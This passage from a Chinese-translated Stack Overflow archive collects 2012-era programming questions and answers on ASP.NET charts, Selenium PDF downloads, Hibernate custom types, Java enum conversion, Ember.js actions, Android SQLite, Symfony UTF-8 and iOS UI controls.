            if (String.Equals(serieName, dr["doman_namn"].ToString(), StringComparison.Ordinal))
            {
                xvals.Add(dr["ranking_date"].ToString());
                yvals.Add(Convert.ToDecimal(dr["ranking_position"].ToString()));
            }

        }
        catch (Exception)
        {

            throw new InvalidOperationException("Diagrammet kunde inte ritas upp");
        }
    }
    try
    {
        Chart1.Series[serieName].XValueType = ChartValueType.String;
        Chart1.Series[serieName].YValueType = ChartValueType.Auto;
        Chart1.Series[serieName].Points.DataBindXY(xvals.ToArray(), yvals.ToArray());
        Chart1.DataManipulator.InsertEmptyPoints(1, IntervalType.Days, serieName);
    }
    catch (Exception ex)
    {
        throw new InvalidOperationException(ex.Message);
    }
}

Chart1.DataBind();
Chart1.Visible = true; 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-06T20:16:28.003

这就是答案！

感谢您指出 JBL！

```
 foreach (System.Web.UI.DataVisualization.Charting.Series serien in Chart1.Series)
     {
                foreach(System.Web.UI.DataVisualization.Charting.DataPoint dataPoint in serien.Points)
                {
                    if (dataPoint.YValues[0] == 0)
                    { 
                       dataPoint.IsEmpty = true;
                    }
                }

                serien.Sort(PointSortOrder.Ascending,sortBy:("X"));
     } 
```

# java - 下载 pdf 文件

> ID：13429942
> 
> 赞同：2
> 
> 时间：2012-11-17T11:05:09.880
> 
> 标签：java, selenium

我正在使用 selenium webdriver 自动化应用程序，下面是我的代码，它工作正常

在这里输入代码：

```
import java. util.concurrent. TimeUnit;

import org.openqa.selenium.By;
import org.openqa.selenium.WebDriver;
import org.openqa.selenium.WebElement;
import org.openqa.selenium.firefox.FirefoxDriver;
import org.openqa.selenium.support.ui.Select;
import org.openqa.selenium.JavascriptExecutor;

import com.thoughtworks.selenium.SeleneseTestCase;

public class MonTaxRep1 extends SeleneseTestCase{

/**
* @param args
*/
public static void main(String[] args) {
// TODO Auto-generated method stub
WebDriver driver = new FirefoxDriver();
driver.get(" URL ");
driver.manage().timeouts().implicitlyWait(30, TimeUnit.SECONDS);
WebElement un= driver.findElement(By.name("username"));
un.sendKeys("clientremote");
driver.findElement(By.name("password")).sendKeys("12345678");
driver.findElement(By.name("submit")).click();
//  find the element and click on signin
//  driver.findElement(By.id("loginButton")).click();
driver.findElement(By.xpath("//a/span[contains(text(),'Thailand')]")).click();
driver.findElement(By.linkText("Williams Limited Thailand")).click();
driver.findElement(By.xpath("//map[@id='Map']/area[3]")).click();
driver.findElement(By.cssSelector("a > img")).click();
driver.findElement(By.xpath("//img[@onclick=\"showItem('_self')\"]")).click();
new Select(driver.findElement(By.name("pay_year"))).selectByVisibleText("2010");
new Select(driver.findElement(By.name("pay_month"))).selectByVisibleText("January");

driver.findElement(By.linkText("Monthly Tax Report")).click();
driver.findElement(By.name("g_title")).sendKeys("Test1");
driver.findElement(By.xpath("//input[@value='Download']")).click(); 
```

当 selenium 单击下载链接时，会出现一个弹出窗口，其中默认包含两个单选按钮，单击单选按钮以打开选项，现在我需要将该单选按钮切换为另存为选项，然后单击确定按钮。当我单击确定按钮时，pdf 文件应保存在某些特定的本地驱动器中。为此，我使用了以下代码，但它不起作用。

```
//Before  opening pop-up get the main window handle 
String mainWindowHandle=driver.getWindowHandle();
//open the pop-up window(i.e click on element which causes open a new window)
driver.findElement(By.xpath("//input[@value='Download']")).click();

//Below code returns all window handles as set
Set s = driver.getWindowHandles();

Iterator ite = s.iterator();
while(ite.hasNext())
{
String popupHandle=ite.next().toString();
if(!popupHandle.contains(mainWindowHandle))
{
driver.switchTo().window(popupHandle);
} 
```

所以请帮我提供代码，我怀疑下载的pdf文件是否可以逐行打开和阅读，是否可以比较其中的一些文本，这可能吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-18T16:44:54.287

简短的回答：[这个已经被问过很多次了，请搜索。](https://stackoverflow.com/search?q=selenium+download+file)

更长更正确的答案：截至目前（2012/11），无法通过 WebDriver 完成。[这是 Selenium 项目最需要的功能之一。](http://code.google.com/p/selenium/issues/detail?id=95)您可以尝试以下方法之一：

1.  [使用HttpURLConnection](http://docs.oracle.com/javase/7/docs/api/java/net/HttpURLConnection.html)或[Apache HttpComponents](http://hc.apache.org/)对指定链接发出请求。您甚至可以通过这种方式下载文件，尽管通常的做法只是断言 200 OK 响应以确保可以下载文件（因为在测试应用程序时通常不需要该文件）。
2.  [使用任何 Java 方法抓取文件。](https://stackoverflow.com/questions/921262/how-to-download-and-save-a-file-from-internet-using-java)或者[这个](https://github.com/Ardesco/Ebselen/blob/master/ebselen-core/src/main/java/com/lazerycode/ebselen/customhandlers/FileDownloader.java)由某人制作的用于与 Selenium 一起使用的工具。
3.  使用[Robot](http://docs.oracle.com/javase/7/docs/api/java/awt/Robot.html)类来简单地按下`Down arrow`和`Enter`或其他东西。但请注意，这仅适用于您的特定浏览器和操作系统。它将在任何其他配置上中断。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2014-04-29T22:30:04.830

在 Firefox 中，您可以通过将以下代码添加到 selenium 测试的 setUp 方法来解决此问题。

```
profile.setPreference("browser.helperApps.neverAsk.saveToDisk", "application/pdf,application/x-pdf"); 
```

如果您想要下载除 pdf 之外的其他类型的文档，您应该查找您尝试下载的任何文档的 MIME 类型并将其添加到逗号分隔列表中。

# spring - 如何使用 org.springframework.orm.hibernate4.LocalSessionFactoryBean 在 Hibernate 中注册自定义类型

> ID：13429943
> 
> 赞同：5
> 
> 时间：2012-11-17T11:05:14.603
> 
> 标签：spring

我正在从休眠 3 迁移到休眠 4，在休眠 3 中，我注册自定义类型的方式是：

```
public class AnnotationSessionFactoryBean extends org.springframework.orm.hibernate3.annotation.AnnotationSessionFactoryBean {
private Collection<? extends BasicType> customTypes;

public Collection<? extends BasicType> getCustomTypes() {
    return customTypes;
}

public void setCustomTypes(Collection<? extends BasicType> customTypes) {
    this.customTypes = customTypes;
}

@Override
protected Configuration newConfiguration() throws HibernateException {
    Configuration configuration = super.newConfiguration();
    if (CollectionUtils.hasEntries(customTypes)) {
        for (BasicType customType:customTypes) {
            configuration.registerTypeOverride(customType);
        }
    }
    return configuration;
}} 
```

我现在正在尝试执行相同的操作，但使用休眠 4，我的问题是最好的方法是如何做到这一点？因为我无权使用“org.springframework.orm.hibernate4.LocalSessionFactoryBean”而不是“org.springframework.orm.hibernate3.annotation.AnnotationSessionFactoryBean”时更改配置。

谢谢

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-12-17T17:01:06.377

在您的实体类之一中，按如下方式注释该类：

```
@TypeDefs({
  @TypeDef(name="type1",typeClass=me.sample.Type1.class),
  @TypeDef(name="type2",typeClass=me.sample.Type2.class)
}) 
```

Spring 3.1 将 AnnotationSessionFactoryBean 与 LocalSessionFactoryBean 合并，委托 Hibernate 配置是否使用注解与 XML 连接。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2014-02-26T13:47:30.827

在 Hibernate 4 中，您`LocalSessionFactoryBean`无需扩展即可使用：

```
sessionFactory.getConfiguration().registerTypeOverride(TypeOverride.INSTANCE); 
```

虽然，这将在 Hibernate 5.0 中消失：

注意：这将被 org.hibernate.boot.registry.StandardServiceRegistryBuilder 和 org.hibernate.metamodel.MetadataSources 取代，而不是在 4.0 版本之后，此时此类将被弃用并计划在 5.0 中删除。详见 HHH-6183、HHH-2578 和 HHH-6586

# c# - EF 5 中的 DataAnnotations 没有代码优先

> ID：13429949
> 
> 赞同：0
> 
> 时间：2012-11-17T11:06:05.153
> 
> 标签：c#, entity-framework

我想知道 EF 5 或更新版本中是否有一些关于数据注释的新功能。我正在做数据库优先，所以据我所知，我必须一直操作 T4，这非常混乱，因为每个 EF 版本 MS 都会更改默认的 T4。所以有人可以告诉我，如果有一些替代这样的事情：

操纵T4：

```
<#=codeStringGenerator.UsingDirectives(inHeader: false, includeAnnotations: true)#>
[MetadataType(typeof(<#=code.Escape(entity)#>Metadata))]
<#=codeStringGenerator.EntityClassOpening(entity)#> 
```

如果类名为“地址”，则生成的类示例：

```
[MetadataType(typeof(AddressMetadata))]
public partial class Address
{ 
```

与生成的“地址”类相同的命名空间中的注释附加类：

```
public class AddressMetadata
{

    [Display(Name = "Straße")]
    public string Street;

    [Display(Name = "Land")]
    public string Country;

    [Display(Name = "PLZ")]
    public string Zip;

    [Display(Name = "Stadt")]
    public string City;
} 
```

这就是我今天做的方式。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-17T12:27:43.453

您无需更改生成的代码。您可以将伙伴类添加到部分类。然后，当重新生成代码时，您不会丢失任何东西。

# c - 堆是否碎片化

> ID：13429956
> 
> 赞同：0
> 
> 时间：2012-11-17T11:06:59.117
> 
> 标签：c, heap-memory

在一个循环中，我在开始时分配了一些内存（在 Linux ARM 上可能高达 2-3k），处理它然后释放它。由于循环有很多迭代，我想知道这种分配/解除分配是否会使堆碎片化，因此后续的“malloc”会失败。

伪代码如下所示：

```
...
while(...){
 list=malloc(N);
 // do some work with list
 free(list);
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-17T11:14:31.050

不，那完全没问题。此外，在更多不同大小的分配之后，堆碎片也开始成为问题。此外，如果您仍然担心，只需在堆栈上使用 alloca 进行分配，就像在循环中一样。

# ember.js - Ember.js：如何设置动作助手的上下文？

> ID：13429965
> 
> 赞同：3
> 
> 时间：2012-11-17T11:08:38.020
> 
> 标签：ember.js

我添加了示例应用程序。 [http://jsfiddle.net/Sly7/amG56/](http://jsfiddle.net/Sly7/amG56/)

JS：

```
App = Ember.Application.create();

App.ApplicationController = Ember.ArrayController.extend({
  selectedBook: null
});

App.ApplicationView = Ember.View.extend({

  actions: {
    selectBook: function(book) {
      this.get('controller').set("selectedBook", book);
    },

    cancel: function(book) {
      alert(book);
    }
  }
});

App.Book = Em.Object.extend({
  name: null
}); 
```

模板：

```
<script type="text/x-handlebars">
  {{#each book in books}}
    <a {{action "selectBook" book target="view"}} href="#">select {{book.name}}</a><br />
  {{/each}}
  <hr />
  Selected Book: {{selectedBook.name}}
  <br />
  <a {{action "cancel" selectedBook target="view"}} href="#">cancel selected book</a>
</script> 
```

​</p>

选择其中一本书。您将看到将显示该书的名称。但是“取消选定的书”链接不起作用。

I think the problem is context of the action helper does not change when a book is selected.

如何实现具有不断变化的上下文的动作助手？或者它是一个错误？

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-11-17T12:07:18.663

**答案在指南中 [http://emberjs.com/guides/templates/actions/#toc_action-parameters](http://emberjs.com/guides/templates/actions/#toc_action-parameters)**

并且上下文被懒惰地评估，所以问题不再发生

**下面不推荐使用的答案**

这里的问题是动作助手是用 selectedBook 上下文解释的。但此时 selectedBook 为空。所以当点击链接时，即使你之前选择了一本书，也为时已晚，对于注册的动作，上下文仍然为空。作为一种解决方法，您可以用 {{with}} 块将其括起来。

```
{{#with selectedBook}} 
  Selected Book: {{name}}
  <br />
  <a {{action cancel this target="view"}} href="#">cancel selected   book</a>
{{/with}} 
```

见：http: [//jsfiddle.net/x82dr/17/](http://jsfiddle.net/x82dr/17/)

顺便说一句，您可以看到 ApplicationView 的代码，我在其中使用控制器属性访问应用程序控制器。使用 Ember.js 约定，控制器在应用程序初始化时被注入到视图中

更新： {{with}} 助手的使用现在似乎不是强制性的，请参阅：[https ://github.com/emberjs/ember.js/issues/1150](https://github.com/emberjs/ember.js/issues/1150)

# c# - asp.net 向导控件，设置步骤名称不可见

> ID：13429967
> 
> 赞同：0
> 
> 时间：2012-11-17T11:09:10.017
> 
> 标签：c#, asp.net

我不想显示步名。“下一步”和“完成按钮”对我来说就足够了。如何看不见这些？！![在此处输入图像描述](../Images/5519faeaa50145a30d75dc455d1accbd.png)

第二个问题；单击 FinishButton 后，我想自动重定向第一步。怎么做？

```
 <asp:Wizard runat="server" ID="MyWizard" OnNextButtonClick="MyWizard_NextButtonClick"
                Width="440px" Height="200px" OnFinishButtonClick="MyWizard_FinishButtonClick">
                <WizardSteps>
                    <asp:WizardStep ID="Wizardstep1" runat="server" StepType="auto">
                   </asp:WizardStep>
                    <asp:WizardStep ID="Wizardstep2" runat="server" StepType="auto">
        </asp:WizardStep> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-17T11:21:42.183

您可以在`Wizard`控件中创建自定义 LayoutTemplate 以隐藏步骤名称。例如：

```
<LayoutTemplate>
    <div>
        <asp:PlaceHolder ID="headerPlaceHolder" runat="server" />
    </div>
    <div>
    <asp:PlaceHolder ID="wizardStepPlaceholder" runat="server" />
    </div>
    <div>
    <asp:PlaceHolder ID="navigationPlaceholder" runat="server" />
    </div>
</LayoutTemplate> 
```

请记住占位符的 id 名称很重要。负责显示您圈出的步骤列表的占位符有 id `sideBarPlaceHolder`（并且您不应该有任何带有此 id 的占位符`LayoutTemlpate`）

第二个问题：您可以有自定义导航模板，例如：

```
<FinishNavigationTemplate>
    <asp:Button ID="PreviousButton" runat="server" Text="Previous step" CausesValidation="false" CommandName="MovePrevious" />
    <asp:Button ID="FinishButton" runat="server" Text="Finish" CausesValidation="true" CommandName="MoveComplete" OnCLick="FinishButton_Click" />
</FinishNavigationTemplate> 
```

请注意，这些按钮已固定`CommandName`（`Wizard`控件需要此）。您可以尝试使用完成按钮的`OnClick`事件跳转到第一步：

```
protected void FinishButton_Click(object sender, EventArgs e)
{
    yourWizard.ActiveStepIndex = 0;
} 
```

# java - 如何在java中将字符串数组转换为枚举数组

> ID：13429968
> 
> 赞同：9
> 
> 时间：2012-11-17T11:09:11.603
> 
> 标签：java, enums, arrays

我有一个字符串数组，其中包含从用户那里获取的枚举值。我现在如何将此字符串数组转换为枚举数组，以便可以迭代元素并在其他方法中进一步使用？这需要在 Java 中完成。

基本上我要问的是，例如，如果我有这个数组

```
String [] names = {"Autumn", "Spring", "Autumn", "Autumn" }; 
```

我有这个枚举

```
enum Season
{ 
    Autumn, Spring;
} 
```

我现在如何将上面的 String 类型数组转换为 enum Season 类型的数组？

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2014-01-28T21:02:56.800

这是一个完整的代码示例：

```
private static List<Season> foo(List<String> slist) {
    List<Role> list = new ArrayList<>();
    for (String val : slist) {
        list.add(Season.valueOf(val));
    }
    return list;
} 
```

现在，如果您想为任何 Enum 创建一个通用方法，它会变得有点棘手。您必须使用“通用方法”：

```
private static <T extends Enum<T>> List<T> makeIt(Class<T> clazz, List<String> values) {
    List<T> list = new ArrayList<>();
    for (String level : values) {
        list.add(Enum.valueOf(clazz, level));
    }
    return list;
} 
```

你必须这样称呼它：

```
List<Strings> slist = ....
List<Season> elist= makeIt(Season.class, slist); 
```

* * *

## 回答 #2

> 赞同：7
> 
> 时间：2012-11-17T11:14:22.517

像这样：[来自这里的代码](http://viralpatel.net/blogs/convert-string-to-enum-instance-string-enum-java/)

```
public enum Weekdays {
    Monday,
    Tuesday,
    Wednesday,
    Thursday,
    Friday,
    Saturday,
    Sunday
} 
```

如果您需要进行查找，您可以执行以下操作：

```
Weekdays weekday = Weekdays.valueOf("Monday");
System.out.println(weekday); 
```

但要小心，因为`IllegalArgumentException`如果提供的`String`不存在，这将抛出一个。

* * *

## 回答 #3

> 赞同：5
> 
> 时间：2014-09-23T03:16:59.180

回答实际问题：

```
public <T extends Enum<T>> T[] toEnums(String[] arr, Class<T> type)
{
    T[] result = (T[]) Array.newInstance(type, arr.length);
    for (int i = 0; i < arr.length; i++)
        result[i] = Enum.valueOf(type, arr[i]);
    return result;
}

Season[] seasons = toEnums(names, Season.class); 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2021-02-04T10:35:24.177

从 Java 8 开始，您可以使用流在一行中实现这一点

```
String [] names = {"Autumn", "Spring", "Autumn", "Autumn" };
List<Season> seasons = Arrays.stream(names).map(Season::valueOf).collect(Collectors.toList()); 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-11-17T11:30:07.900

如果您使用的是 Swing 而不是命令提示符或 Web 表单，您实际上可以将枚举实例传递给 JComboBox。当用户进行选择时，您将直接获得 Enum 实例，而无需在 String 和 Enum 之间进行转换。这样做的好处是您不必担心更改枚举名称或大写/小写错误。

例子：

```
public class Enums 
{
    public enum Days{
        MONDAY, TUESDAY, WEDNESDAY, THURSDAY, FRIDAY, SATURDAY, SUNDAY; 

        public String toString() {
            //return user-friendly name, or whatever else you want.
                    //for complex rendering, you need to use cell renderer for the combo box
            return name().substring(0,1) + name().toLowerCase().substring(1, name().length());
        };
    }

    public static void main(String[] args) {
        JFrame frame = new JFrame("Enum test");
        frame.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);

        final JComboBox<Days> combo = new JComboBox<>(Days.values());
        combo.addItemListener(new ItemListener() {
            @Override
            public void itemStateChanged(ItemEvent e) {
                if(e.getStateChange() == ItemEvent.SELECTED){
                    Days selected = combo.getItemAt(combo.getSelectedIndex());
                    System.out.println(selected);
                }
            }
        });
        frame.add(combo);

        frame.pack();
        frame.setLocationRelativeTo(null);
        frame.setVisible(true);
    }
} 
```

没有类型转换，没有字符串匹配。超级安全。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2012-11-17T11:36:23.603

```
 String s[]=new String[Numbers.values().length];
    int i =0;
    for (Numbers op : Numbers.values()) {
        s[i++] =op.toString();
        System.out.println(op.toString());
    }

   public enum Numbers {
    one,
    two,
    three
   } 
```

# android - android 程序在移动设备上无法运行，但在平板电脑和模拟器中可以正常运行

> ID：13429969
> 
> 赞同：0
> 
> 时间：2012-11-17T11:09:35.480
> 
> 标签：android, sqlite, mobile, emulation

我使用 SQLite 在 Eclipse 中编写了一个程序。

当我运行它时，它在模拟器（API 7）中可以正常工作，并且当我在具有 android 版本 2.2 的平板电脑上运行它时也可以正常工作。

但是当我尝试在 android 2.3 版的手机上运行它时，它不起作用并给我这个错误：

编译错误`:String query = "SELECT Cart_ID from Tbl order by Cart_ID DESC limit 1"`

我的主要代码：

```
public void insertQuote(String Quote,int Price1,int Count1,int GoodIDEnter ) 
{
              String query = "SELECT Cart_ID from Tbl_Cart order by Cart_ID DESC limit 1";
              Cursor c = db.rawQuery(query, null);
               if (c != null && c.moveToFirst()) 
               {
                   goodid = c.getLong(0); 

               }
} 
```

我应该怎么办？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-17T11:21:21.403

```
<uses-sdk android:minSdkVersion="7" /> 
```

在清单文件中添加/修改它。

# eclipse-rcp - 如何在 Eclipse 中控制 EditorView 的上下文菜单？

> ID：13429980
> 
> 赞同：0
> 
> 时间：2012-11-17T11:10:06.157
> 
> 标签：eclipse-rcp, eclipse-plugin

我正在尝试控制 Eclipse 中 EditorView 的上下文菜单项的可见性。这是插件配置代码

```
<visibleWhen>
   <with  variable="activeEditorId">
      <equals value="org.eclipse.ui.DefaultTextEditor"></equals>
   </with>
</visibleWhen> 
```

但不知何故，它不起作用，根本没有显示编辑器的菜单项。任何帮助将不胜感激。

谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-17T11:31:28.420

你可以试试`org.eclipse.jdt.ui.CompilationUnitEditor`吗？

# oracle - 无法在调试中修改此值

> ID：13429984
> 
> 赞同：2
> 
> 时间：2012-11-17T11:11:10.817
> 
> 标签：oracle, plsql, oracle-sqldeveloper

在 Oracle SQL Developer 中调试我的过程时，我无法为输入数据设置任何值。

当我尝试将值从 NULL 更改为任何其他值时，我收到以下错误。问题是什么？什么是*“调试器进程可能不允许修改值”*，我该如何解决？

![在此处输入图像描述](../Images/f0e71101029d557813c4d673d82d9b78.png)

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-17T22:17:07.457

我认为问题在于您无法修改参数的值。我进行了快速测试，能够更改变量的值，但是当我尝试修改参数时收到与您相同的错误消息。

但是，无法确定，Oracle 调试是一团糟。DBMS_DEBUG 文档是错误的。并且对于 SQL Developer 使用的 DBMS_DEBUG_JDWP 没有任何有用的信息。

如果可能，您必须在将值传递给过程之前对其进行更改。

# url - 如何在 Heroku 上重命名子域名？

> ID：13429985
> 
> 赞同：2
> 
> 时间：2012-11-17T11:11:12.497
> 
> 标签：url, heroku

我正在 Heroku 上试验 node.js。刚开始，看到 url 为：secret-shore-(number).herokuapp.com。在文档中找不到，但是否可以重命名子域 } else { 做一些 url makeUp ？}

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-11-17T15:38:59.230

通过重命名您的应用程序，您将更改其子域。[**查看有关重命名应用程序**](https://devcenter.heroku.com/articles/renaming-apps)的 Heroku 文档。或者，您可以在 Heroku 的“我的应用程序”仪表板中重命名该应用程序，您必须手动更新您的 git 远程位置以及链接中的说明。

# php - navigator 不知道 symfony2 项目中的重音符号（é、è à ....）

> ID：13429990
> 
> 赞同：0
> 
> 时间：2012-11-17T11:12:01.833
> 
> 标签：php, symfony, utf-8

我阅读了一个 symfony2 教程，但是当我运行我的项目时，我遇到了 é、à、è ... 的问题。我添加了允许使用 UTF-8 但同样的问题的标签：这是我的页面 index.html.twig ：

```
 <html>
<head>
        <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
        <title></title>
</head>
 <body>
  <h1>Liste des catégories</h1>
  {% for cat in categories %}
   <p>{{ cat.nom }}</p>
  {% else %}
   <p>Aucune catégorie n'a été trouvée.</p>
  {% endfor %}
 </body>
</html> 
```

我怎样才能做到这一点，提前谢谢你

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-17T12:52:25.580

在 PHP 中使用 UTF-8：

1.  将文件保存为 UTF-8，不带[BOM](http://en.wikipedia.org/wiki/Byte_order_mark)。
2.  使用 UTF-8 编码为您提供响应。`<meta>`通常这还不够，您需要发送适当的`Content-Type`http-header。
3.  使用 doctype，至少是 html5 的：`<!DOCTYPE html>`

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-17T11:17:02.273

您的源文件可能实际上并未保存为 UTF-8。检查您的编辑器设置。

# iphone - UIBarButtonItem 偏移量

> ID：13429993
> 
> 赞同：4
> 
> 时间：2012-11-17T11:12:19.540
> 
> 标签：iphone, uibarbuttonitem

你能看到按钮左边的距离吗？如何消除这个距离？

![在此处输入图像描述](../Images/acf716e64717993b7c6b8472841fef28.png)

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-11-17T11:16:43.117

在按钮的左侧添加一个垫片，例如：

```
UIBarButtonItem *backButtonItem = ....;

UIBarButtonItem *spacer = [[UIBarButtonItem alloc] initWithBarButtonSystemItem:UIBarButtonSystemItemFixedSpace target:nil action:nil];
spacer.width = -5; 

self.navigationItem.leftBarButtonItems = @[ spacer, backButtonItem ]; 
```

# xcode - UICollectionView 显示的单元格太少

> ID：13429994
> 
> 赞同：0
> 
> 时间：2012-11-17T11:12:29.870
> 
> 标签：xcode, ios6, uicollectionview

我有一个 UICollectionViewController 数组大小为 20 作为数据源。

但是当我运行它时，我只看到 8 个单元格。NSLog 显示计数仍然是 20。

有这个还不够吗？

```
- (NSInteger)collectionView:(UICollectionView *)view numberOfItemsInSection:(NSInteger)section; 
```

{

```
return self.datasource.count; 
```

}

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-17T11:37:28.027

您在以下两个委托方法中设置了什么？

```
 - (NSInteger)numberOfSectionsInCollectionView:(UICollectionView *)collectionView
    {
        return TotalItems / NoOfItemsPerSection;
    }

    - (NSInteger)collectionView:(UICollectionView *)collectionView numberOfItemsInSection:(NSInteger)section
    {
        return NoOfItemsPerSection;
    } 
```